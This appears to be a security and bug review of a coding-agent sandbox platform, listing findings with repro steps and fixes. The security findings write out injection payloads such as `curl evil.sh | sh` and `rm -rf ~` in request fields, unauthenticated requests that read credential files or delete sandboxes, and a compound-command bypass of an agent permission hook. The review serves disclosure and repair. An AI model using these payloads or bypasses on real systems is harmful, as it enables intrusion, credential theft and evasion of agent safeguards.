# Bug Report — Daytona Background Agents

Review date: 2026-07-08. Findings are grouped by severity. Each entry has a location, reproduction steps, and a proposed fix. Line numbers reflect the state of the repo at review time and may drift slightly.

---

## CRITICAL / HIGH — Security

### S1. `/api/sandbox/*` routes have no authentication or ownership check (IDOR → shell/secret exfiltration)
- **Files:** `packages/web/app/api/sandbox/{ssh,terminal,delete,download,files,state}/route.ts`
- **Problem:** None of these handlers call `requireAuth()` or verify that the supplied `sandboxId` belongs to the caller. They take `sandboxId` straight from the request body and act on it with the single app-wide `DAYTONA_API_KEY`. The `agent/stream` route documents and fixes exactly this threat (`lib/db/api-helpers.ts:133-141`) but the `sandbox/*` family was never hardened.
- **Repro:** With no session cookie, `POST /api/sandbox/ssh {"sandboxId":"<victim-uuid>"}` returns a working SSH command into another user's sandbox. `POST /api/sandbox/files {"sandboxId":"<victim>","action":"read-file","filePath":"/root/.claude/.credentials.json","autoStart":true}` reads arbitrary paths (secrets). `POST /api/sandbox/download` exfiltrates the repo; `POST /api/sandbox/delete` destroys it.
- **Fix:** Add `requireAuth()` and verify ownership (`prisma.chat.findFirst({ where: { sandboxId, userId } })`, or scheduled-job equivalent) at the top of each handler; return 404 otherwise.

### S2. `/api/sandbox/git` — command injection via unescaped `repoPath`/`currentBranch`/`targetBranch` + no ownership check
- **File:** `packages/web/app/api/sandbox/git/route.ts` (body params ~line 73; interpolations at 99, 194, 304, 331, 377, 393, 414–421)
- **Problem:** `repoPath`, `currentBranch`, `targetBranch` come from the JSON body and are interpolated raw into `sandbox.process.executeCommand(...)` shell strings — no `escapeShell` (contrast `sandbox/files/route.ts`). The route requires GitHub auth but never checks the `sandboxId` is the caller's.
- **Repro:** `POST /api/sandbox/git {"sandboxId":"<any>","repoPath":"/x; curl evil.sh | sh; #","action":"list-branches"}` → arbitrary command execution in that sandbox. Or `currentBranch:"main; rm -rf /tmp/*"` on a merge.
- **Fix:** `escapeShell()` every interpolated value; validate branch names against a safe pattern; add a sandbox-ownership check.

### S3. `PATCH /api/chats/[chatId]` lets the client set `sandboxId`/`backgroundSessionId`/`sessionId` freely (re-opens the fixed stream IDOR)
- **File:** `packages/web/app/api/chats/[chatId]/route.ts:282-285`
- **Problem:** No validation that the supplied sandbox/session belongs to the user. `requireChatStreamAccess` was hardened to read these from the chat row, but the user fully controls their own chat row via this PATCH.
- **Repro:** `PATCH /api/chats/<my-chat> {"sandboxId":"<victim-sandbox>","backgroundSessionId":"<victim-session>"}` then `GET /api/agent/stream?chatId=<my-chat>&...` reads the victim's agent event log/output.
- **Fix:** Do not accept `sandboxId`/`backgroundSessionId`/`sessionId`/`previewUrlPattern` from the client on this PATCH (server-managed), or validate ownership.

### S4. `/api/git/push` — no ownership check, and trusts a body-supplied `githubToken`
- **File:** `packages/web/app/api/git/push/route.ts:9-56`
- **Problem:** Operates on any `sandboxId` (no ownership check); when `githubToken` is passed in the body the route drives a push from an arbitrary sandbox using an attacker-supplied token. `repoName` is interpolated into a path unescaped.
- **Fix:** Require session auth, verify sandbox ownership, drop the body-supplied token path.

### S5. Cron/`snapshot/rebuild` routes fail OPEN when `CRON_SECRET` is unset
- **Files:** `packages/web/app/api/snapshot/rebuild/route.ts:11-15`; `cron/agent-lifecycle/route.ts:26-29`; `cron/refresh-claude-creds`
- **Problem:** `if (secret && authHeader !== ...)` — when `CRON_SECRET` is not set the guard is skipped entirely, so anyone can trigger a multi-minute image rebuild (DoS) or drive lifecycle crons. A missing env var silently disables auth.
- **Fix:** Fail closed in production (require the secret unless `NODE_ENV !== "production"`).

### S6. Desktop: no navigation-origin restriction — foreign page inherits the privileged preload API
- **File:** `packages/desktop/src/main.ts:73-81` (+ `preload.ts`, `license-detect.ts:222-224`)
- **Problem:** `will-navigate` only blocks `/api/auth/signin`; any other in-window navigation loads a foreign page with the preload bridge attached. That page can call `window.electron.getClaudeLicenseAutoDetect()` (returns the user's Claude OAuth credentials from Keychain/`~/.claude/.credentials.json`) and exfiltrate. `sandbox:false` at main.ts:44 compounds this.
- **Fix:** In `will-navigate` and `setWindowOpenHandler`, `preventDefault()` for any URL whose origin ≠ `new URL(BACKEND_URL).origin`.

### S7. Desktop: deep link sets the session cookie with no state/nonce — session fixation
- **File:** `packages/desktop/src/main.ts:137-152`
- **Problem:** Any web page/email linking `background-agents://auth?token=<attacker-JWT>` silently replaces the victim's session cookie, logging them into an attacker-controlled account.
- **Fix:** Generate a one-time `state` when opening the auth flow and reject `auth` deep links whose state doesn't match; optionally confirm before switching sessions.

### S8. Desktop: `shell.openExternal` on unvalidated renderer URLs
- **File:** `packages/desktop/src/main.ts:65-68, 287-289`
- **Problem:** Remote content can pass `file://`/`smb://`/arbitrary protocol URLs; on Windows this can execute code or leak NTLM hashes.
- **Fix:** Allow-list `http:`/`https:`/`mailto:` before calling `openExternal`.

### S9. OpenCode MCP config with bearer tokens is written into the repo working tree
- **File:** `packages/agent-configuration/src/mcp/index.ts:134`
- **Problem:** OpenCode MCP config is written to `/home/daytona/project/opencode.json` (the git clone), embedding `Authorization: Bearer <token>` (Smithery/GitHub tokens). The agent commits/pushes working-tree changes → secrets land in the user's GitHub repo.
- **Fix:** Write to the global config `~/.config/opencode/opencode.json`, or add to `.git/info/exclude` and reference tokens via `{env:...}`.

### S10. Claude permission hook `deny-except` allow-check matches anywhere — compound-command bypass
- **File:** `packages/agent-configuration/src/permissions/claude.ts:68-81`
- **Problem:** The inner grep looks for one allowed form anywhere in the whole command string with no `LEAD` anchor or word boundary. `git rebase main && git rebase --abort` passes and runs the disallowed `git rebase main`; `--continue-anything` is treated as `--continue`.
- **Fix:** Evaluate each `LEAD`-separated subcommand independently and require the allowed flag immediately after the same prefix occurrence, with boundaries.

### S11. `escapeHtml` does not escape quotes
- **File:** `packages/web/lib/html.ts:4-9`
- **Problem:** Only `& < >` are escaped. Current call sites are element-context only (no live bug), but the first future use inside an HTML attribute becomes an injection hole.
- **Fix:** Add `.replace(/"/g,"&quot;").replace(/'/g,"&#39;")`.

---

## HIGH — Correctness

### C1. Rules-of-Hooks violation in `AssistantContent` — React crash when a streaming message changes state
- **File:** `packages/web/components/MessageBubble.tsx:106-147`
- **Problem:** `useMemo` (line ~145) is called after three conditional early returns. Every send creates an empty assistant placeholder that first renders via the `isEmpty` early return (0 hooks), then re-renders with content (1 hook) when the first stream delta arrives → "Rendered more hooks than during the previous render" and the chat tree unmounts. Reverse (content → error) throws "fewer hooks".
- **Repro:** Send a message; when the first assistant token/tool-call streams in, the hook count changes and React throws.
- **Fix:** Move the `useMemo` above the first early return (or drop it — `mergeConsecutiveToolCalls` is cheap).

### C2. RepoCombobox / BranchCombobox: infinite fetch-retry loop on fetch failure
- **Files:** `packages/web/components/chat/RepoCombobox.tsx:57-82`; `BranchCombobox.tsx:59-72`
- **Problem:** `loading` is in the effect deps and flips true→false on error while `repos`/`lastFetchedRepo` stay unchanged, so the guard passes again, `setError(null)` wipes the error, and the fetch restarts — unbounded request loop; error text never stays visible.
- **Repro:** Open the repo/branch picker while `/api/github/repos` or `/api/github/branches` returns 401/500 (expired token). Network tab shows requests firing forever.
- **Fix:** Remove `loading` from deps; track attempt state in a ref (set `lastFetchedRepo`/attempted flag in `.catch` too) and add an explicit Retry button.

### C3. Scheduled-job "at TIME / on DAY" pickers are dead — schedule never honored, and edit resets them
- **Files:** `packages/web/components/scheduled-jobs/ScheduleFields.tsx:106-140`; `lib/hooks/useScheduledJobForm.ts:114-115, 183-184`; `app/api/scheduled-jobs/route.ts:142-153`
- **Problem:** The client sends `runAtHour`/`runAtDay`, but there are no such fields in `CreateScheduledJobBody`/PATCH, no Prisma columns, and the server computes `nextRunAt: addMinutes(now, intervalMinutes)`. So "Every day at 9:00 AM" actually runs at creation-time + 24h; weekly day-of-week is ignored. On edit the pickers reset to Monday/9 AM (nothing to restore), presenting a misleading schedule the user "confirms".
- **Repro:** Create a job "Every day at 9:00 AM" at 4:37 PM → it runs ~4:37 PM daily.
- **Fix:** Persist `runAtHour`/`runAtDay` (schema + POST/PATCH + `nextRunAt` alignment + return in the job response), or remove the pickers until implemented.

### C4. Pending-message replay after OAuth sign-in never fires — message silently lost
- **File:** `packages/web/lib/hooks/usePendingMessageReplay.ts:83, 104`
- **Problem:** After sign-in, `startNewChat()` now returns a `draft-…` id (no DB row). The send effect gates on `chats.some(c => c.id === pendingSend.chatId)`, which is never true for draft ids (`chats` only holds server chats), so `sendMessage` never runs. The pending message was already cleared from sessionStorage, so it's permanently lost; `updateChatById(draftId,…)` also PATCHes a 404.
- **Repro:** Logged out → type a message → send → complete OAuth → returned to app with nothing sent.
- **Fix:** Bypass the `chats.some` gate for draft ids (`sendMessage` materializes drafts itself); skip `updateChatById` for draft ids.

### C5. SDK: Pi provider errors silently dropped — failed run ends as empty success
- **File:** `packages/sdk/src/agents/pi/parser.ts:222-242`
- **Problem:** Pi reports API failures via `message_end`/`turn_end` with `stopReason:"error"`/`errorMessage` (see fixture `tests/fixtures/jsonl-reference/pi.jsonl`), which are ignored; `agent_end` then emits a bare `end`, so a 400/auth/quota failure surfaces as a clean completion with empty content.
- **Fix:** In `message_end`/`turn_end`, when `stopReason==="error"` or `errorMessage` present, emit `{ type:"end", error: resolveAgentError(errorMessage,"pi") }`, deduped against `agent_end`.

### C6. Goose MCP config write destroys Goose's provider config
- **File:** `packages/agent-configuration/src/mcp/index.ts:149-165` (+ `sdk/src/sandbox/daytona.ts:144-155`)
- **Problem:** `generateGooseConfig` emits a file containing only `extensions:` + MCP entries and uploads it wholesale, replacing `~/.config/goose/config.yaml`. That file (written once, guarded by `test -f`) holds `GOOSE_PROVIDER`/`GOOSE_MODEL`/`GOOSE_MODE` and the `developer` extension — all permanently deleted, breaking goose.
- **Fix:** Parse/merge the YAML preserving top-level keys and existing `extensions.developer`.

### C7. Codex MCP config is deleted/overwritten before the CLI starts — MCP never works for Codex
- **Files:** `packages/agent-configuration/src/mcp/index.ts:83-98`; `packages/sdk/src/agents/codex/index.ts:44, 53`
- **Problem:** `setupMcpForAgent` runs before `createSession`→`codexSetup`, which `rm -f`s (or overwrites) `~/.codex/config.toml` — wiping the `[mcp_servers.*]` the MCP writer just created.
- **Fix:** Merge both writers into one TOML generator, or have `codexSetup` strip only provider keys and have the MCP writer append/merge.

---

## MEDIUM

### M1. Merging into a running chat's branch silently does nothing
- **File:** `packages/web/components/modals/git-dialogs/useGitDialogs.ts:154-159`
- **Problem:** The frontend returns before `callSandboxGit`, but the comment claims "the API will create the error message." No request is made, no feedback, no merge.
- **Repro:** Chat B's agent running; from chat A open Merge, pick B's branch, click Merge → dialog closes instantly with zero feedback.
- **Fix:** Let the request through so the backend produces the system message, or surface a local error before closing.

### M2. Admin activity "Load more" replaces the list instead of appending
- **Files:** `packages/web/app/admin/page.tsx:453,467`; `components/admin/ActivityFeed.tsx:311,358-365`; `lib/query/hooks/useAdminActivityQuery.ts:72-82`
- **Problem:** The query is keyed per page with no accumulation/`placeholderData`. Clicking "Load more" swaps the key → `data` becomes undefined (skeleton), then only events 21–40 render; pages 1–20 are gone with no "previous" control.
- **Fix:** Use `useInfiniteQuery` and concatenate pages, or at minimum `placeholderData: keepPreviousData`.

### M3. Admin dashboard collapses to full-page skeleton on every toggle
- **File:** `packages/web/app/admin/page.tsx:83,131`
- **Problem:** Each time-range/metric/include-admins toggle changes the stats query key → fresh cache entry with `isLoading===true` (no `keepPreviousData`) → the early return unmounts the whole page, including the toggle just clicked.
- **Fix:** Add `placeholderData: keepPreviousData` and gate the skeleton on first-ever load (`isLoading && !data`).

### M4. TOCTOU race in message POST "busy" gate → duplicate sandboxes + double agent runs
- **File:** `packages/web/app/api/chats/[chatId]/messages/route.ts:102-104` vs `_lib/ensure-sandbox.ts:103-105`, `_lib/persist-turn.ts:90-102`
- **Problem:** The `status === "creating"|"running"` gate reads a status captured earlier; status is only flipped much later. Two concurrent POSTs both pass, both call `createSandboxForChat`; the second overwrites `sandboxId`, orphaning the first sandbox (leak) and starting two billable turns.
- **Fix:** Make the gate atomic: `updateMany({ where:{ id, status:{ notIn:["creating","running"] } }, data:{ status:"creating" } })` and treat `count===0` as 409, before any sandbox work.

### M5. Scheduled-jobs poll reverts the user's selected run; stale response can overwrite
- **File:** `packages/web/components/scheduled-jobs/ScheduledJobsView.tsx:99-126`
- **Problem:** Every 30s tick unconditionally resets `selectedRun` to the newest run, clobbering the user's selection mid-read. Cleanup only clears the interval — an in-flight fetch for a previous job still resolves and overwrites state.
- **Fix:** `setSelectedRun(prev => prev && runs.some(r=>r.id===prev.id) ? prev : runs[0])`; add a `cancelled` flag guarding all setters.

### M6. Git dialogs: Enter re-fires merge/rebase/PR while a request is in flight
- **Files:** `packages/web/components/ui/BranchSelector.tsx:79-85`; `modals/git-dialogs/useGitDialogs.ts:146-147`
- **Problem:** The footer button is disabled via `actionLoading`, but the Enter path isn't. A second Enter while the dialog is open (focus in the autofocused selector) fires the handler again → two `/api/github/pr` POSTs or two concurrent merges.
- **Repro:** Open Create PR, press Enter twice quickly.
- **Fix:** `if (actionLoading) return` at the top of each handler and/or suppress Enter-submit when loading.

### M7. Composer permanently stuck in "sending" (and message lost) when a send early-returns
- **Files:** `packages/web/lib/hooks/useSendMessage.ts:87-91,133`; `useMessageDispatch.ts:123-129`; `useChatComposer.ts:275-277`
- **Problem:** `isSendingMessage` is only cleared by a status transition. If a draft's first send fails (offline/500) or double-send returns `null`, no optimistic update runs, status never changes, so the composer stays disabled until switching chats. Worse, `handleSend` already cleared input/files, so the text is gone.
- **Fix:** Resolve `sendMessage` with an outcome and clear the flag in `.finally()`; restore draft text on the failure path.

### M8. SSE "update" frames overwrite the last message, not the assistant placeholder by id
- **File:** `packages/web/lib/hooks/useStreaming.ts:154-162`
- **Problem:** The handler writes to `messages[lastIndex]` although `assistantMessageId` is in scope. Any merge/append that lands a message after the placeholder mid-stream (timestamp re-sort with skewed client clock, or a client-side git message) corrupts the wrong bubble and leaves the real placeholder empty.
- **Fix:** `const i = messages.findIndex(m => m.id === assistantMessageId)` and update that (fall back to last assistant).

### M9. Skill / MCP search: stale-response race (no abort/guard on debounced fetch)
- **Files:** `packages/web/components/skills/SkillSearchView.tsx:73-98`; `components/chat/McpServersCombobox.tsx:187-223`
- **Problem:** Effect cleanup clears only the timeout, never in-flight fetches. A slower older-query response can land after a newer one and overwrite results → list shows results for a query no longer in the box; installing picks the wrong item.
- **Fix:** AbortController aborted in cleanup, or capture the query per request and ignore mismatches.

### M10. Settings: one half-finished custom endpoint silently discards ALL endpoint changes
- **File:** `packages/web/components/modals/SettingsModal.tsx:314-319`
- **Problem:** Settings save on close; if any endpoint is invalid, the entire `customEndpoints` array is omitted from the payload, so unrelated edits and deletions are lost.
- **Repro:** Delete endpoint A → Add endpoint → type only a name → close → reopen: A is back.
- **Fix:** `data.customEndpoints = endpoints.filter(isValid)`, or block close with a warning.

### M11. Admin user GitHub link built from display name — 404 or wrong profile
- **File:** `packages/web/components/admin/UserTable.tsx:146,376`
- **Problem:** `href={\`https://github.com/${user.name || user.githubId}\`}` — `user.name` is a display name (may contain spaces) and `githubId` is a numeric id; neither is the login. Link 404s or lands on a stranger.
- **Fix:** Use `https://github.com/u/${user.githubId}` (numeric redirect), or store/expose the real login.

### M12. Admin chart dates off by one day west of UTC
- **File:** `packages/web/components/admin/charts/chartFormatters.ts:9-18`
- **Problem:** Stats API emits date-only strings; `new Date("2026-07-08")` is UTC midnight but `getMonth()/getDate()` render local time, so every negative-offset timezone (all the Americas) labels the previous day.
- **Fix:** Parse without TZ shift (`const [y,m,d]=value.split("-").map(Number); new Date(y,m-1,d)`) or format with `timeZone:"UTC"`.

### M13. `createFileCommit` breaks on non-Latin1 content and can't update existing files
- **File:** `packages/common/src/github.ts:237-252`
- **Problem:** `btoa(content)` throws for any char > U+00FF (emoji/CJK/curly quotes). The Contents API PUT needs the existing blob `sha` to update, so "create or update" 422s on existing paths. `options.path` isn't URL-encoded.
- **Fix:** `Buffer.from(content,"utf8").toString("base64")`; GET the path first to pass `sha`; encode path segments.

### M14. MessageBubble memo comparator too narrow — stale `onOpenFile` wipes preview tabs; upload chips never appear
- **Files:** `packages/web/components/MessageBubble.tsx:78-87`; `app/page.tsx:642-645`; `lib/hooks/usePreview.ts:68-84`; `lib/chat-messages.ts:194`
- **Problem:** The comparator ignores `uploadedFiles`, `messageType`, `isError`, and the callbacks. `onOpenFile` is an inline arrow closing over `previewItems`, so a finished bubble keeps a stale closure: click file A then B from the same old bubble and tab A silently disappears. Also `applySendSuccess` patches `uploadedFiles` onto the sent message, but chips never render until a full remount.
- **Fix:** Compare `uploadedFiles`/`messageType`/`isError`; make `openPreview` use a functional update (stable `onOpenFile`).

### M15. SDK: `patchMeta` is a non-atomic read-modify-write — lost meta updates under concurrent polls
- **File:** `packages/sdk/src/background/session.ts:419-423` (+ `getSnapshot`, `cancel`)
- **Problem:** `getSnapshot` is documented concurrency-safe and polled on a shared session, but it and `cancel` do read-then-write on `meta.json`. Two concurrent patches interleave; a `cancelled:true` flag or a captured `sessionId` can be clobbered, breaking resume.
- **Fix:** Serialize meta writes (in-process mutex/queue) or use atomic compare-and-set.

### M16. SDK: Claude `error_max_turns` and Copilot missing `exitCode` reported as success/false-error
- **Files:** `packages/sdk/src/agents/claude/parser.ts:150-153`; `copilot/parser.ts:355-358`
- **Problem:** Claude `isError` checks only `error_during_execution`/`error`, so `error_max_turns` falls through as a clean end. Copilot `ev.exitCode !== 0` is true when `exitCode` is `undefined` → bogus "Process exited with code undefined".
- **Fix:** Claude — treat any subtype other than `"success"` as error. Copilot — `typeof ev.exitCode === "number" && ev.exitCode !== 0`.

### M17. SDK: Codex `item.started` catch-all emits spurious/duplicate `tool_start`, leaving dangling tools
- **File:** `packages/sdk/src/agents/codex/parser.ts:134-178`
- **Problem:** `item.started` matches every item type: `web_search`/`todo_list`/`reasoning` produce a `tool_start` with no matching `tool_end` (permanently "running"); `file_change` emits start twice; `command_execution` with `aggregated_output===undefined` drops its `tool_end`.
- **Fix:** Whitelist tool item types in `item.started`; dedupe `file_change` by `item.id`; always emit `tool_end` for completed commands/searches.

### M18. SDK: credentials written with `echo '...'` corrupt backslashes
- **Files:** `packages/sdk/src/agents/claude/index.ts:56-62`; `codex/index.ts:57-61`
- **Problem:** `escapeShell` only escapes single quotes; `echo` under dash/`sh -c` interprets `\\`→`\` and `\n`→newline in the `JSON.stringify` output → corrupted credential JSON → auth failure. Other config paths already use `printf '%s'`.
- **Fix:** `printf '%s' <quoted-json> > file`.

### M19. sandbox-git: unescaped branch/refspec in `fetchBranch`/`fetch` — injection & breakage
- **File:** `packages/sandbox-git/src/commands.ts:121-122, 141-142`
- **Problem:** `clone()` escapes `branch`, but `fetchBranch`/`fetch` interpolate branch/refspec raw. A branch name with spaces or `` ;`id` ``/`$()` breaks or executes shell in the sandbox.
- **Fix:** `esc()` the refspec/ref.

### M20. sandbox-git: `parseGitStatus` truncates branch names containing `.`
- **File:** `packages/sandbox-git/src/parsers.ts:25-26`
- **Problem:** `/^## ([^.\s]+)/` cuts `## release.2.0...origin/release.2.0` to `"release"`, and `## No commits yet on main` to `"No"`. Any dotted branch is corrupted downstream.
- **Fix:** Parse against the `...` separator: `/^## ([^\s]+?)(?:\.\.\.|\s|$)/`, special-case "No commits yet".

### M21. sandbox-jobs: env-var NAME interpolated unescaped into `export` — injection
- **File:** `packages/sandbox-jobs/src/jobs.ts:54-56` (mirror `sdk/src/sandbox/daytona.ts:27-29`)
- **Problem:** Only the value is quoted; a key like `` x`$(id)` `` or `X; curl evil|sh #` executes on every job start. The web env UI doesn't charset-validate keys.
- **Fix:** Validate keys `^[A-Za-z_][A-Za-z0-9_]*$` and reject non-conforming names.

### M22. sandbox-skills: unescaped `source`/`skillId`/`repoPath` in skill CLI commands — injection
- **File:** `packages/sandbox-skills/src/sandbox/{install,list,uninstall}.ts`
- **Problem:** `source`, `skillId`, `skillName`, `repoPath` are interpolated raw into `npx skills ...`. A handle like `owner/repo; rm -rf ~ #` runs arbitrary shell.
- **Fix:** Shell-quote every interpolated value.

### M23. sandbox-terminal: concurrent `setupTerminal` calls race → duplicate/failed PTY servers
- **File:** `packages/sandbox-terminal/src/sandbox/setup.ts:138, 240-250`
- **Problem:** The `isServerRunning` check and server start aren't atomic (`flock` only serializes npm install). Two tabs opening at once both start `websocket-pty-server.js` on port 44777; the second hits EADDRINUSE and dies, leaving a lingering bootstrap session.
- **Fix:** Guard check-and-start under the same `flock`, re-checking inside the critical section.

### M24. Desktop: deep links dropped on cold start (`mainWindow` null) — macOS auth dead-ends
- **File:** `packages/desktop/src/main.ts:128-130`
- **Problem:** On macOS `open-url` fires before `createWindow()`; `handleDeepLink` returns early when `mainWindow` is null, dropping the auth JWT and leaving an unauthenticated window.
- **Fix:** Queue the URL and replay it after `createWindow()`.

### M25. Desktop git-sync: repo dir keyed by name only — cross-owner collision + `..` escape
- **File:** `packages/desktop/src/git-sync.ts:113-116`
- **Problem:** `repoDir` uses only the repo name, so `alice/app` and `bob/app` map to `<root>/app` while `repoQueues` keys on the full string → concurrent isomorphic-git ops on one `.git` (index/ref corruption). `repo="x/.."` escapes the root.
- **Fix:** Use `<root>/<owner>/<name>` (key queues on the resolved dir) and reject `repo` not matching `/^[\w.-]+\/[\w.-]+$/`.

### M26. dev-cron: daily/timed schedules become every-minute, and runs overlap
- **Files:** `packages/dev-cron/src/parser.ts:44-59`; `index.ts:129-133`
- **Problem:** `0 0 * * *` (daily) and `M H * * *` fall through to a 60s default, so a daily cron (e.g. refresh-creds) is hammered every minute in dev. `runCron` is fire-and-forget in `setInterval`, so slow jobs overlap and pile up.
- **Fix:** Handle `M H * * *` as 24h; guard re-entry (`let running`), or reschedule with `setTimeout` after completion.

---

## LOW

### L1. ChatInput repo link points to `.../tree/null` before the branch exists
- **File:** `packages/web/components/chat/ChatInput.tsx:516-520` — `chat.branch` can be null during sandbox creation, so the href is `.../tree/null` (404). `ChatHeader` guards this; ChatInput doesn't. Fall back to `chat.baseBranch`/repo root.

### L2. Hourly-activity tooltip shows wrong AM/PM at 11:00
- **File:** `packages/web/components/admin/charts/HourlyActivityChart.tsx:80-86` — `h===11` → "11 AM - 12 AM" (should be 12 PM); `h===23` → "11 PM - 12 PM" (should be 12 AM). Use a single `fmt(h)` helper handling 0/12/24.

### L3. Duplicate "Actions" header in mobile commands sheet for repo-less chats
- **File:** `packages/web/components/MobileCommandsMenu.tsx:136-148` — the else-branch header and the `chat &&` header both render. Remove the else-branch header.

### L4. Queued-message ids collide (`q-${Date.now()}`)
- **File:** `packages/web/lib/hooks/useQueueDispatch.ts:167` — two enqueues in the same ms get identical ids; removing one deletes both and React keys collide. Use `q-${nanoid()}`.

### L5. `fmtTokens` renders 999,950–999,999 as "1000K"
- **File:** `packages/web/lib/format.ts:8` — `(999.96).toFixed(0)` → "1000K" instead of "1.0M". Round/clamp before branching.

### L6. `localHourToUtc` wrong for half-hour offsets; day-of-week not shifted across UTC midnight
- **File:** `packages/web/components/scheduled-jobs/form-config.ts:19-27` (latent behind C3) — `Math.floor` drops :30/:45 offsets; `runAtDay` sent with a UTC hour without adjusting the day when conversion crosses midnight. Convert (day, hour) as one local→UTC datetime.

### L7. `useFileUpload`: no-op unmount cleanup + leaking preview blob URLs; size budget races
- **File:** `packages/web/lib/hooks/useFileUpload.ts:164-170,211,299-326` — `[]`-dep cleanup sees the initial empty array and revokes freshly-created URLs; `getFilePreviewUrl` mints a new blob URL every render with no revoke; `addFiles` computes the size budget from a stale closure so two same-tick adds can exceed 4 MB. Cache URLs per file and revoke on remove/clear; compute totals inside a functional update.

### L8. `internalError()` leaks raw exception messages to clients
- **File:** `packages/web/lib/db/api-helpers.ts:59-62` — Prisma/Daytona/git stderr returned verbatim. Return a generic 500 body; log detail server-side.

### L9. `PATCH /api/chats/[chatId]` accepts arbitrary `status`/`model`/`agent`/`repo`/`baseBranch`
- **File:** `packages/web/app/api/chats/[chatId]/route.ts:272-287` — any string is written straight to the DB (e.g. `status:"running"` strands the chat as busy). Whitelist `status`; validate `agent`/`model`.

### L10. sandbox-git: `git status --porcelain -b 2>&1` folds stderr into parsed output
- **File:** `packages/sandbox-git/src/commands.ts:100` — warnings/advice ≥3 chars are parsed as phantom files; renamed entries store `"old -> new"` as the path. Drop `2>&1`, use `-z`, handle `->`.

### L11. SDK: Droid failed tool results discard the error message
- **File:** `packages/sdk/src/agents/droid/parser.ts:75-76` — `tool_result` with `isError:true` and no `value` yields `undefined` output, so the failure reason is lost (tool renders completed-empty). Fall back to `extractErrorMessage(json.error)`.

### L12. SDK: ELIZA substitution uses user text as `String.replace` replacement — `$`-sequence corruption
- **File:** `packages/sdk/src/agents/eliza/patterns.ts:675-677,730-762` — `$\``/`$'`/`$&`/`$1`/`$$` in the user prompt are interpreted specially and garble output (persisted to memory files). Use a replacer function or escape `$`→`$$`.

### L13. SDK: sandbox-jobs cursor byte-count drift on non-UTF-8 log bytes
- **File:** `packages/sandbox-jobs/src/jobs.ts:231-235`; `shell.ts:60-61` — `tail -c +N` counts bytes but the cursor is re-derived from a decoded string, so invalid/truncated multibyte output drifts the cursor (skip/repeat). Track offsets via a byte-accurate channel.

### L14. sandbox-terminal: PTY server never closes the WebSocket when the shell exits
- **File:** `packages/sandbox-terminal/src/server/pty-server.ts:56-89` — no `ptyProcess.onExit` handler, so after `exit` the socket leaks and the client hangs. Add `ptyProcess.onExit(() => { try { ws.close() } catch {} })`.

### L15. sandbox-skills: `discover` reads `cat "${skillMdPath}"` with unescaped path
- **File:** `packages/sandbox-skills/src/sandbox/discover.ts:103-104` — a skill dir containing `"`/`$`/backticks breaks or injects. Single-quote the path.

### L16. SDK: SSE `complete` conflict/markdown callbacks read one render late
- **File:** `packages/web/lib/hooks/useChatWithSync.ts:81-84` (+ `useStreaming.ts:65-70`) — `onConflictStateChangeRef.current` is passed by value; a `complete` frame arriving after re-registration but before the next render invokes the stale callback and drops the conflict indicator. Pass the refs, not `.current`.

### L17. `setupClaudePermissions` throws on malformed `settings.json`
- **File:** `packages/agent-configuration/src/permissions/claude.ts:133-138` — `JSON.parse` of an invalid reused `~/.claude/settings.json` throws with no try/catch, failing the whole turn. Back up the bad file and write fresh settings.
